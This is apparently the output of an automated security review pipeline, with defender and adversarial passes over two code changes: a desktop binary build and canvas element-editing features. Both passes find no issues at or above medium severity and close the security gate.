### Attacker pass (ethical-hacker)

- **Injection/untrusted-input flow:** none — no `pull_request` trigger, all interpolated values are static matrix literals or `secrets.*`; `github.ref` only used in an `if:` boolean, never shell-interpolated.
- **TOCTOU in lipo/staging window:** none — sequential in one `run:` block on one ephemeral runner, no cross-job artifact download, no second writer.
- **Provenance:** both arches built in the same job from the same checked-out tag ref; x86_64 dev-server is Bun cross-compiled (not fetched) and embeds the same committed `dist/runtime/*.js`; x86_64 agent-browser is the same pinned npm dependency's second binary. No new external source.
- **AI/MCP attack-surface delta:** zero by construction — no new MCP tool, route, CSP/canvas-iframe boundary, or agent-reachable surface; recompiling to a second ISA changes none of {inputs, exposed tools, trust boundaries, data flows}.
- **Fail-safe noted:** `lipo -create` errors loud on mismatched/non-Mach-O inputs rather than silently shipping a mislabeled binary.

## Design-system + a11y (bundled into this validate pass)

- **design-system-guard:** PASS — copy-only diff, no new components/tokens/styling.
- **a11y-auditor:** PASS — 0 violations attributable to the diff on `/desktop` and `/docs/desktop` (390px + 1280px). Pre-existing fumadocs-chrome contrast/aria findings noted but out of scope (also present on untouched `/docs/design`).

## Scenario

- **scenario-runner:** PASS, 0 blockers, `parity_ok: true`. Full docs-site scenario suite judged N/A (no existing scenario step targets `/desktop`/`/docs/desktop`); ran a proportionate render+layout spot-check at desktop/mobile widths instead. Follow-up suggested: add a docs-site scenario step for `/desktop` + `/docs/desktop` (not a blocker).

No findings at or above the medium severity floor. Safe to close the security gate and proceed to commit.

decision.rationale:
# Security review — feature-element-editing-robustness

**Scope:** `6f6a7858..HEAD` (commit `b9e8bf75` — Stages L5-L7 + K + G2 + G4; `b0bba611` trivial stats regen, skipped). **Config:** severityFloor=medium, includeAi=true, scope=[classic,ai]. **Verdict: PASS — 0 blockers at/above medium, 0 exploit chains.**

## Defender pass (security-auditor)

PASS, 0 blockers. This diff reuses existing main-origin-gated write lanes and adds no new HTTP route, no new trust boundary, no runtime-state taxonomy change — verified, not assumed.

- `contextual-toolbar.tsx` (new align/distribute/tidy write caller) rides the **existing** `reposition-request` handler (`client/app.jsx:8458-8483`), which pins to `activePath`/`e.source === activeWin` per the DDR-054 confused-deputy guard. `commitMoves` only iterates the user's own `elementSelections`; no cross-canvas or cross-element write is possible.
- `canvas-shell.tsx`'s new "Select layer" submenu + deep-select only call `selSet.replace(...)` (selection state) — no write path introduced.
- `context-menu.tsx`'s widened `MenuItem.submenu` (function form) renders labels as React text nodes — no `dangerouslySetInnerHTML`, no XSS surface even from attacker-authored `data-cd-id`/`aria-label` text.
- `canvas-edit.ts`'s `editStringAttr` src-expression refusal is correctly scoped to `name === 'src'` only, throws a caught `CanvasEditError` (→ clean `{ok:false, status:422}`, no stack-trace leak) — a net safety improvement over the prior silent-discard behavior.
- `equal-spacing-detector.ts`'s new pure math (`computeAlign`/`computeDistribute`/`computeTidyGrid`/`computePairGap`) is bounded, I/O-free, no ReDoS/injection surface.
- `measure-overlay.tsx` (new file) verified genuinely inert: 0 outbound calls, read-only rect painting.
- No drift in `http.ts`/`server.ts` route allowlists or the runtime-state taxonomy triad (`git/service.ts`, `cli/lib/gitignore-block.mjs`, `.gitignore`).

## Adversarial pass (ethical-hacker)

Clean pass, 0 findings at/above medium, 0 exploit chains. Threat-modeled and traced (not assumed):

1. **Confused deputy via align/distribute/tidy-up** — `commitMoves` sends no `m.canvas` at all (nothing to spoof); write targets are the user's own current selection, resolved via `resolveSelectionEl`. Worst case = writing numeric left/top to a user-selected element in the actively-viewed canvas — no escalation beyond the pre-existing reposition lane.
2. **"Select layer" + lazy submenu** — `elementsFromPoint` only enumerates the user's own canvas DOM (a static TSX mock, no cross-origin/cross-user content); boundary confirmed selection-only via the same `e.source === activeWin` gate.
3. **`editStringAttr` src refusal** — no escaping bypass (identical `escapeAttr` on both the literal and refused-then-still-editable-via-other-attrs paths); refusal is a fast-fail before any write, not a DoS amplifier.
4. **Trifecta / outbound exfil** — not present; no new network calls, no new LLM-prompt feed in the diff.
5. **AI/MCP attack surface** — unchanged; no MCP tool definitions or agent-prompt files touched.

Minor non-finding (below floor): `commitMoves` posts with `targetOrigin: '*'`, consistent with every other intra-app `dgn:` message in this codebase (fixed trusted parent, geometry-only payload) — not a regression.

## Conclusion

0 blockers at/above the `medium` severity floor across both passes. Verdict: **PASS**, safe to close.
